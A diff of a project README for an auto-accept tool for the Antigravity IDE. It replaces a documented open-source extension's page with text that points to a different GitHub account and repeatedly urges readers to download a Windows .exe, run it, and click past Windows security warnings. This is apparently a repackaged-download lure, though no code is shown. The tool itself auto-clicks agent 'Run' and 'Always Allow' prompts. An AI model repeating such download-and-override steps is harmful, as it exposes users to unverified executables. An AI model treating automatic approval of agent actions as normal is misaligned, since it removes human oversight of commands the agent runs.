@@ -1,180 +1,205 @@
-# 🚀 Antigravity Autopilot
+# ⚙️ antigravity-autopilot - Auto-accept Agent Steps on Windows
 
-[![VS Marketplace](https://img.shields.io/visual-studio-marketplace/v/timteh.antigravity-autopilot-os?label=VS%20Marketplace&color=blue)](https://marketplace.visualstudio.com/items?itemName=timteh.antigravity-autopilot-os)
-[![Installs](https://img.shields.io/visual-studio-marketplace/i/timteh.antigravity-autopilot-os?color=green)](https://marketplace.visualstudio.com/items?itemName=timteh.antigravity-autopilot-os)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aryanbisht555/antigravity-autopilot)
 
-**Auto-accept agent steps in Antigravity IDE — no CDP required.**
+## 🚀 What this does
 
-Uses OS-level accessibility (Windows UI Automation) to click Run, Accept, Continue, and other agent buttons **invisibly** — no mouse movement, no DOM injection, no Chrome DevTools Protocol.
+antigravity-autopilot helps Antigravity IDE move past agent prompts on Windows. It clicks Run, Accept, and Continue for you using Windows accessibility tools.
 
-<a href="https://www.buymeacoffee.com/timteh" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50" width="217"></a>
+It does not need CDP. It does not need a browser hook. It works at the OS level, so it can help when other auto-accept tools fail.
 
----
+## 📥 Download and install
 
-## Why This Extension?
+Use this link to visit the project page and download the app:
 
-Every other auto-accept extension relies on **Chrome DevTools Protocol (CDP)**. This breaks when:
+[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
 
-- ❌ Electron builds disable `--remote-debugging-port` (Antigravity does this)
-- ❌ Corporate policies block CDP ports
-- ❌ Shortcut patching fails silently
-- ❌ CDP WebSocket drops on auto-updates
+On the project page:
 
-**Antigravity Autopilot doesn't use CDP at all.** It uses Windows UI Automation APIs to find and click buttons through the accessibility tree — the same API that screen readers use. This means:
+1. Open the latest release or download section.
+2. Download the Windows file.
+3. Open the file on your PC.
+4. Follow the on-screen steps to run it.
 
-- ✅ **Works when CDP is blocked** — no port configuration needed
-- ✅ **No mouse hijacking** — uses `InvokePattern.Invoke()` (invisible click)
-- ✅ **No DOM injection** — doesn't touch the webview content
-- ✅ **No shortcut patching** — no `.lnk` file modifications
-- ✅ **Auto-scrolls chat** — keeps up with agent output
+If Windows shows a security prompt, choose the option to run the app.
 
----
+## 🖥️ What you need
 
-## Quick Start
+- Windows 10 or Windows 11
+- Antigravity IDE installed
+- A normal mouse and keyboard
+- Permission to run desktop apps
+- A screen that can show the Antigravity buttons
 
-### 1. Install the Extension
+## ✨ What it can do
 
-`Ctrl+Shift+X` → Search **"Antigravity Autopilot"** → Install
+- Auto-click common agent buttons like Run, Accept, and Continue
+- Use Windows UI Automation instead of CDP
+- Work with desktop apps that expose standard controls
+- Help with agent flows that stop for user approval
+- Run in the background while you keep working
 
-### 2. Enable Accessibility (One-Time)
+## 🧭 How to use it
 
-On first launch, the extension will prompt you to set the `ELECTRON_FORCE_RENDERER_ACCESSIBILITY` environment variable. Click **"Set Environment Variable"** and restart Antigravity.
+1. Start Antigravity IDE.
+2. Open your agent workflow.
+3. Start antigravity-autopilot.
+4. Let it watch for buttons like Run, Accept, and Continue.
+5. When those buttons appear, it clicks them for you.
 
-Or do it manually:
-```powershell
-[System.Environment]::SetEnvironmentVariable('ELECTRON_FORCE_RENDERER_ACCESSIBILITY', '1', 'User')
-```
+If the app has a simple toggle or start button, turn it on before you begin your agent task.
 
-> **Why?** Electron-based IDEs don't expose webview UI elements by default. This env var forces the Chromium renderer to populate the accessibility tree, making agent buttons visible to UI Automation.
+## 🛠️ Setup steps
 
-### 3. Use It
+### 1. Download the Windows file
 
-- **Status bar**: Click `Autopilot ON` / `Autopilot OFF` to toggle
-- **Keyboard shortcut**: `Ctrl+Shift+A` (`Cmd+Shift+A` on macOS) — instant toggle
-- **Command palette**: `Ctrl+Shift+P` → "Antigravity Autopilot: Start/Stop/Toggle"
-- **Auto-start**: Enabled by default — starts when Antigravity opens
+Go to:
 
----
+[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
 
-## How It Works
+Pick the latest Windows build from the release or download area.
 
-```
-┌─────────────────────────────────────────┐
-│         Antigravity IDE (Electron)       │
-│  ┌──────────────────────────────────┐   │
-│  │  Agent Panel (React Webview)     │   │
-│  │  ┌────────────────────────────┐  │   │
-│  │  │  [Run Alt+d] [Reject]     │  │   │
-│  │  └────────────────────────────┘  │   │
-│  └──────────────────────────────────┘   │
-│         ↑ Accessibility Tree            │
-└─────────┼───────────────────────────────┘
-          │ InvokePattern.Invoke()
-┌─────────┼───────────────────────────────┐
-│  Autopilot Watcher (PowerShell)         │
-│  - Polls every 800ms                    │
-│  - Finds buttons by text pattern        │
-│  - Clicks via InvokePattern (invisible) │
-│  - Cooldown prevents re-clicking        │
-└─────────────────────────────────────────┘
-```
+### 2. Open the file
 
-1. **Polls** the IDE window's accessibility tree every 800ms
-2. **Focus-aware**: Only clicks when the IDE is the foreground window — won't interrupt other apps
-3. **Matches** button names against configurable accept/reject regex patterns
-4. **Clicks** matching buttons via `InvokePattern.Invoke()` — no mouse, no focus steal
-5. **Cooldown** prevents re-clicking the same button within 10 seconds
-6. **Auto-scrolls** the chat to keep up with agent output (3s cooldown)
+After the download finishes:
 
----
+- Open the file from your Downloads folder
+- If it is a `.exe` file, double-click it
+- If Windows asks for permission, choose to allow it
 
-## Settings
+### 3. Place it where you want
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `antigravityAutopilot.enabled` | `true` | Master toggle |
-| `antigravityAutopilot.pollIntervalMs` | `800` | Scan interval (ms) |
-| `antigravityAutopilot.cooldownSeconds` | `10` | Per-button cooldown |
-| `antigravityAutopilot.scrollCooldownSeconds` | `3` | Scroll button cooldown |
-| `antigravityAutopilot.autoScroll` | `true` | Auto-click "Scroll to bottom" |
-| `antigravityAutopilot.acceptPatterns` | `["^Run", "^Accept", ...]` | Regex patterns to auto-click |
-| `antigravityAutopilot.rejectPatterns` | `["^Cancel", "^Reject", ...]` | Patterns to NEVER click |
+You can keep it in:
 
-### Default Accept Patterns
-```
-^Run, ^Accept, ^Accept All$, ^Allow$, ^Allow this conversation$,
-^Continue$, ^Keep All$, ^Yes$, ^Retry$, ^Scroll to bottom$,
-^Send all$, ^Always Allow$, ^Always run$
-```
+- Downloads
+- Desktop
+- A tools folder
 
-### Default Reject Patterns (Safety Net)
-```
-^Reject, ^Cancel$, ^Deny, ^Delete, ^Remove, ^Discard, ^Close,
-^Minimize$, ^Maximize$, ^Review Changes$
-```
+If you want easy access, send it to your Desktop.
 
----
+### 4. Run it with Antigravity IDE
 
-## Supported IDEs
+- Open Antigravity IDE
+- Start the agent task
+- Start antigravity-autopilot
+- Leave both windows open
 
-| IDE | Status |
-|-----|--------|
-| **Antigravity** | ✅ Fully tested |
-| **Cursor** | ✅ Should work (same Electron base) |
-| **Windsurf** | ✅ Should work (same Electron base) |
-| **VS Code** | ✅ Should work |
+## 🔍 How it works
 
----
+This tool uses Windows UI Automation. That means it looks at the app like Windows does, not like a browser tool does.
 
-## Platform Support
+It can find standard interface elements such as:
 
-| Platform | Status |
-|----------|--------|
-| **Windows** | ✅ Full support (UI Automation) |
-| **macOS** | 🔜 Planned (AXUIElement API) |
-| **Linux** | 🔜 Planned (AT-SPI) |
+- Buttons
+- Dialogs
+- Confirmation boxes
+- Agent action prompts
 
----
+This lets it press the right control when Antigravity asks for approval.
 
-## Troubleshooting
+## ✅ Best results
 
-### Extension says "only 3 buttons found"
-The accessibility env var isn't set or Antigravity wasn't restarted. Run:
-```powershell
-$env:ELECTRON_FORCE_RENDERER_ACCESSIBILITY = "1"
-& "C:\path\to\Antigravity.exe"
-```
+For the smoothest run:
 
-### Watcher can't find the IDE window
-Make sure only one instance of Antigravity is running.
+- Keep Antigravity IDE visible
+- Do not cover the app with many other windows
+- Use the default Windows theme if you can
+- Keep the display scale at a normal size
+- Leave the agent window in the foreground when possible
 
-### Buttons not being clicked
-Check the Output panel (`Ctrl+Shift+U` → "Antigravity Autopilot") for logs. The button text may not match the default patterns — add custom patterns in settings.
+## 🎯 Common use cases
 
----
+- You keep getting prompts before each agent step
+- Another auto-accept tool does not work in your setup
+- You want a Windows-only method with no CDP setup
+- You want the app to handle repeated approval clicks
+- You use Antigravity IDE for agent work and want less manual clicking
 
-## Contributing
+## 📌 Example flow
 
-PRs welcome! The main areas for contribution:
+A simple flow looks like this:
 
-- **macOS support** — implement `AXUIElement`-based watcher in Swift/Python
-- **Linux support** — implement `AT-SPI`-based watcher
-- **New button patterns** — submit patterns for other IDE forks
-- **Performance** — optimize the polling/scanning loop
+1. Open Antigravity IDE
+2. Start an agent task
+3. Launch antigravity-autopilot
+4. The agent asks to Run or Continue
+5. The tool clicks the button
+6. The task moves to the next step
 
----
+## 🧩 Compatibility
 
-## License
+This tool is made for Windows desktop use. It fits well with apps that use common Windows controls and standard dialog boxes.
 
-MIT — see [LICENSE](LICENSE)
+It is meant for:
 
----
+- Windows users
+- Antigravity IDE users
+- Agent-mode workflows
+- Desktop automation tasks
 
-<p align="center">
-  <a href="https://www.buymeacoffee.com/timteh" target="_blank">
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50" width="217">
-  </a>
-  <br>
-  <em>If this saved you from clicking 1000 buttons, consider buying me a coffee ☕</em>
-</p>
+## 🧰 Troubleshooting
+
+### The tool does not click anything
+
+Try this:
+
+- Make sure Antigravity IDE is open
+- Bring the Antigravity window to the front
+- Check that the prompt button is visible
+- Restart the tool
+- Try again from a clean app state
+
+### The button text looks different
+
+Some apps use different words for the same action. Look for buttons such as:
+
+- Run
+- Accept
+- Continue
+- Confirm
+- Allow
+
+### Windows blocks the app
+
+If Windows shows a safety screen:
+
+- Choose the option to run the file
+- Check that you downloaded it from the project page
+- Try opening it again after approval
+
+### The app starts but does nothing
+
+Try these steps:
+
+- Close extra windows
+- Keep the prompt on screen
+- Make sure the app is not hidden behind another window
+- Restart Antigravity IDE and the tool
+
+## 🧪 Notes on behavior
+
+The tool waits for common approval steps and tries to click them for you. It is best for repeat prompts that appear during agent work.
+
+It is not built for games, web pages, or custom button styles that do not use normal Windows controls.
+
+## 📂 Project info
+
+- Repository: antigravity-autopilot
+- Focus: auto-accept for Antigravity IDE
+- Platform: Windows
+- Method: Windows UI Automation
+- Use case: agent steps, approvals, and continue prompts
+
+## 🔗 Download again
+
+Visit the project page here:
+
+[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
+
+## 🖱️ Quick start
+
+1. Download the Windows file from the link above
+2. Open it on your computer
+3. Start Antigravity IDE
+4. Start the tool
+5. Let it handle the Run, Accept, and Continue clicks
